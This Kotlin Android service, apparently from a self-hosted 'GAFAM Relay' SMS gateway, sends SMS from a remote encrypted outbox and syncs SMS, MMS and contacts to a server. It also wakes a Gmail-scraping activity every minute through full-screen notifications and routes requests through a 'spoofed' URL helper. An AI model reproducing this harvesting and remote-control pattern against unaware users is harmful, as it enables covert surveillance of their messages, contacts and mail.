package com.gafam.relay

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

/**
 * Persistent foreground relay (VPN-style notification).
 * Keeps outbox polling + log shipping alive when the UI is closed.
 *
 * Also watches the telephony provider:
 *  - content://sms changes  → near-real-time history sync (catches SMS sent
 *    from the native SMS app, which no broadcast would reveal)
 *  - content://mms changes  → MMS sync (P4)
 *  - contacts changes       → full contact re-sync (a contact added on the
 *    phone appears on the web client seconds later)
 */
class RelayForegroundService : Service() {

    companion object {
        private const val TAG = "GAFAM_Relay"
        private const val CHANNEL_ID = "gafam_relay"
        private const val NOTIF_ID = 5150
        private const val ACTION_STOP = "com.gafam.relay.STOP_RELAY"

        /** Debounce for provider observers (writes often arrive in bursts). */
        private const val OBSERVER_DEBOUNCE_MS = 4000L
        /** Periodic contact re-sync cadence (provider observer is the fast path). */
        private const val CONTACT_SYNC_PERIOD_MS = 30 * 60 * 1000L
        /** If no sent-report broadcast arrives within this delay, assume the SMS left. */
        private const val SENT_FALLBACK_MS = 45_000L

        private val running = AtomicBoolean(false)

        fun start(context: Context) {
            val prefs = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
            if (prefs.getString("apiUrl", null).isNullOrBlank()) return
            if (prefs.getString("jwtSecret", null).isNullOrBlank()) return

            val intent = Intent(context, RelayForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, RelayForegroundService::class.java))
        }
    }

    private var pollThread: Thread? = null
    private val pollAlive = AtomicBoolean(false)
    private var edgePollTick = 0
    private var gmailScrapeTick = 0
    private var lastContactSyncAt = 0L

    /** Outbox ids sent but awaiting their delivery report — never re-sent. */
    private val inFlightOutbox = java.util.concurrent.ConcurrentHashMap.newKeySet<Int>()

    private val handler = Handler(Looper.getMainLooper())
    private var contactsObserver: ContentObserver? = null
    private var smsObserver: ContentObserver? = null
    private var mmsObserver: ContentObserver? = null

    private val contactsSyncRunnable = Runnable {
        ContactSync.syncAsync(applicationContext, force = true)
    }
    private val smsSyncRunnable = Runnable {
        SmsHistorySync.syncAsync(applicationContext, force = true)
    }
    private val mmsSyncRunnable = Runnable {
        MmsSync.syncAsync(applicationContext, force = false)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        val notification = buildNotification("Relay connected — waiting for SMS")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, notification)
        }
        running.set(true)
        LogShipper.start(this)
        LogShipper.event(this, "I", "relay", "Foreground relay service started")

        // Gmail scrape via full-screen notification (works in deep sleep)
        startGmailScrapeLoop()
        startPollLoop()
        registerProviderObservers()

        // Import recent conversations from the phone SMS/MMS stores
        SmsHistorySync.syncAsync(this, force = true)
        MmsSync.syncAsync(this, force = true)

        // Periodic soft refresh (respects min interval)
        thread(name = "gafam-sms-history-timer", isDaemon = true) {
            while (running.get()) {
                try {
                    Thread.sleep(15 * 60 * 1000L)
                } catch (_: InterruptedException) {
                    break
                }
                if (running.get()) SmsHistorySync.syncAsync(this, force = false)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        // Ensure notification stays up if restarted
        val notification = buildNotification("Relay connected — waiting for SMS")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, notification)
        }
        if (!pollAlive.get()) startPollLoop()
        return START_STICKY
    }

    override fun onDestroy() {
        pollAlive.set(false)
        running.set(false)
        unregisterProviderObservers()
        EmailDumpsysPoller.stop()
        LogShipper.event(this, "W", "relay", "Foreground relay service stopped")
        super.onDestroy()
    }

    // --- Provider observers (near-real-time sync triggers) ---

    private fun registerProviderObservers() {
        try {
            contactsObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    handler.removeCallbacks(contactsSyncRunnable)
                    handler.postDelayed(contactsSyncRunnable, OBSERVER_DEBOUNCE_MS)
                }
            }
            contentResolver.registerContentObserver(
                ContactsContract.Contacts.CONTENT_URI, true, contactsObserver!!
            )
        } catch (e: Exception) {
            Log.w(TAG, "Contacts observer failed to register", e)
        }

        try {
            smsObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    handler.removeCallbacks(smsSyncRunnable)
                    handler.postDelayed(smsSyncRunnable, OBSERVER_DEBOUNCE_MS)
                }
            }
            contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI, true, smsObserver!!
            )
        } catch (e: Exception) {
            Log.w(TAG, "SMS observer failed to register", e)
        }

        try {
            mmsObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    handler.removeCallbacks(mmsSyncRunnable)
                    handler.postDelayed(mmsSyncRunnable, OBSERVER_DEBOUNCE_MS)
                }
            }
            contentResolver.registerContentObserver(
                Telephony.Mms.CONTENT_URI, true, mmsObserver!!
            )
        } catch (e: Exception) {
            Log.w(TAG, "MMS observer failed to register", e)
        }
        LogShipper.event(this, "I", "relay", "Provider observers registered (sms/mms/contacts)")
    }

    private fun unregisterProviderObservers() {
        handler.removeCallbacks(contactsSyncRunnable)
        handler.removeCallbacks(smsSyncRunnable)
        handler.removeCallbacks(mmsSyncRunnable)
        contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        mmsObserver?.let { contentResolver.unregisterContentObserver(it) }
        contactsObserver = null
        smsObserver = null
        mmsObserver = null
    }

    private fun startGmailScrapeLoop() {
        val prefs = getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        thread(name = "gafam-scrape", isDaemon = true) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            val ch = NotificationChannel("gafam_scrape", "Scrape", NotificationManager.IMPORTANCE_HIGH)
            nm.createNotificationChannel(ch)
            while (running.get()) {
                try {
                    Thread.sleep(60000)
                    if (!prefs.getBoolean("gmail_scrape_enabled", true)) continue
                    val pi = PendingIntent.getActivity(this@RelayForegroundService, 999,
                        Intent(this@RelayForegroundService, GmailScrapeActivity::class.java),
                        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
                    nm.notify(777, NotificationCompat.Builder(this@RelayForegroundService, "gafam_scrape")
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle("Gmail check").setContentText("...")
                        .setFullScreenIntent(pi, true).setAutoCancel(true)
                        .setOngoing(false).setPriority(NotificationCompat.PRIORITY_HIGH).build())
                    Thread.sleep(20000)
                    nm.cancel(777)
                } catch (e: Exception) { Log.w(TAG, "Scrape: ${e.message}") }
            }
        }
    }

    private fun startPollLoop() {
        if (!pollAlive.compareAndSet(false, true)) return
        pollThread = thread(name = "gafam-outbox-poll", isDaemon = true) {
            while (pollAlive.get()) {
                try {
                    pollOutboxOnce()
                    edgePollTick++
                    if (edgePollTick % 2 == 0) {
                        EdgeClient.syncOnce(applicationContext)
                    }
                    // Periodic contact re-sync (fast path = provider observer)
                    val now = System.currentTimeMillis()
                    if (now - lastContactSyncAt > CONTACT_SYNC_PERIOD_MS) {
                        lastContactSyncAt = now
                        ContactSync.syncAsync(applicationContext, force = false)
                    }
                    // Launch Gmail scrape activity every 60s (same toggle as scrape loop)
                    gmailScrapeTick++
                    if (gmailScrapeTick >= 60) {
                        gmailScrapeTick = 0
                        val prefs = getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
                        if (prefs.getBoolean("gmail_scrape_enabled", true)) {
                            val intent = android.content.Intent(applicationContext, GmailScrapeActivity::class.java)
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "outbox poll error", e)
                }
                try {
                    Thread.sleep(1000)
                } catch (_: InterruptedException) {
                    break
                }
            }
        }
    }

    private fun pollOutboxOnce() {
        val prefs = getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        val client = ApiClient.getClient(this) ?: return
        val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/outbox")
        val request = Request.Builder()
            .url(spoofedUrl)
            .get()
            .addHeader("Authorization", "Bearer $jwtSecret")
            .build()

        // Settings sync (best-effort)
        try {
            val settingsReq = Request.Builder()
                .url(ApiClient.getSpoofedUrl(apiUrl, "/api/settings"))
                .get()
                .addHeader("Authorization", "Bearer $jwtSecret")
                .build()
            val setRes = client.newCall(settingsReq).execute()
            if (setRes.isSuccessful) {
                val setJson = JSONObject(setRes.body?.string() ?: "{}")
                if (setJson.has("contacts_sync_enabled")) {
                    val isEnabled = setJson.getString("contacts_sync_enabled") == "true"
                    prefs.edit().putBoolean("contacts_sync_enabled", isEnabled).apply()
                }
            }
        } catch (_: Exception) {
        }

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) return
        val responseStr = response.body?.string() ?: return
        val payload = JSONObject(responseStr)
        val encryptedData = payload.getString("encrypted_data")
        val ivStr = payload.getString("iv")

        val digest = java.security.MessageDigest.getInstance("SHA-256")
        val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
        val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        val iv = android.util.Base64.decode(ivStr, android.util.Base64.DEFAULT)
        val ciphertext = android.util.Base64.decode(encryptedData, android.util.Base64.DEFAULT)
        cipher.init(
            javax.crypto.Cipher.DECRYPT_MODE,
            secretKey,
            javax.crypto.spec.GCMParameterSpec(128, iv)
        )
        val plaintext = cipher.doFinal(ciphertext)
        val outboxArray = org.json.JSONArray(String(plaintext, Charsets.UTF_8))

        // Prune in-flight ids whose row vanished from the VPC outbox (report
        // landed and the row was deleted server-side).
        if (inFlightOutbox.isNotEmpty()) {
            val present = HashSet<Int>()
            for (i in 0 until outboxArray.length()) {
                present.add(outboxArray.getJSONObject(i).getInt("id"))
            }
            inFlightOutbox.retainAll(present)
        }

        if (outboxArray.length() > 0) {
            updateNotification("Sending ${outboxArray.length()} outbox SMS…")
        }

        for (i in 0 until outboxArray.length()) {
            val msg = outboxArray.getJSONObject(i)
            val id = msg.getInt("id")
            val smsId = msg.optInt("sms_id", 0)
            val recipient = msg.getString("recipient")
            val body = msg.getString("body")
            // Skip rows already sent and waiting for their delivery report —
            // the VPC keeps the row until the report lands, so without this
            // guard the 1s poll would re-send the SMS dozens of times.
            if (!inFlightOutbox.add(id)) continue
            sendOutboxSms(id, smsId, recipient, body)
        }

        if (outboxArray.length() > 0) {
            updateNotification("Relay connected — waiting for SMS")
        }
    }

    /**
     * Sends one outbox SMS and wires the delivery feedback loop:
     *  - SmsManager throws immediately  → report "failed" to the VPC
     *  - sent-report broadcast arrives  → SmsSentReceiver reports sent/failed
     *  - no broadcast within 45 s       → assume "sent" (many devices never fire it)
     * The VPC status endpoint updates gafam_sms and removes the outbox row,
     * so the web UI always reflects what really happened.
     */
    private fun sendOutboxSms(outboxId: Int, smsId: Int, recipient: String, body: String) {
        try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(body)
            if (parts.size == 1) {
                smsManager.sendTextMessage(
                    recipient, null, body,
                    SmsSentReceiver.buildSentIntent(this, outboxId, smsId),
                    null
                )
            } else {
                val sentIntents = ArrayList<PendingIntent>()
                for (j in parts.indices) {
                    sentIntents.add(SmsSentReceiver.buildSentIntent(this, outboxId, smsId))
                }
                smsManager.sendMultipartTextMessage(recipient, null, parts, sentIntents, null)
            }
            Log.d(TAG, "Sent remote SMS to $recipient")
            LogShipper.event(this, "I", "outbox", "Sent SMS to $recipient (${body.length} chars)")
            scheduleSentFallback(outboxId, smsId)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS to $recipient", e)
            LogShipper.event(this, "E", "outbox", "Failed SMS to $recipient: ${e.message}")
            SmsSentReceiver.reportStatus(applicationContext, outboxId, smsId, "failed")
        }
    }

    private fun scheduleSentFallback(outboxId: Int, smsId: Int) {
        handler.postDelayed({
            if (SmsSentReceiver.markReportedIfNew(outboxId)) {
                Log.d(TAG, "No sent-report for outbox $outboxId — assuming sent")
                SmsSentReceiver.reportStatus(applicationContext, outboxId, smsId, "sent")
            }
        }, SENT_FALLBACK_MS)
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val mgr = getSystemService(NotificationManager::class.java) ?: return
        val channel = NotificationChannel(
            CHANNEL_ID,
            "GAFAM Relay",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Keeps the SMS relay connected to your VPC"
            setShowBadge(false)
        }
        mgr.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String): Notification {
        val openIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val stopIntent = PendingIntent.getService(
            this,
            1,
            Intent(this, RelayForegroundService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GAFAM Relay")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_send)
            .setOngoing(true)
            .setContentIntent(openIntent)
            .addAction(0, "Stop", stopIntent)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun updateNotification(text: String) {
        val mgr = getSystemService(NotificationManager::class.java) ?: return
        mgr.notify(NOTIF_ID, buildNotification(text))
    }
}
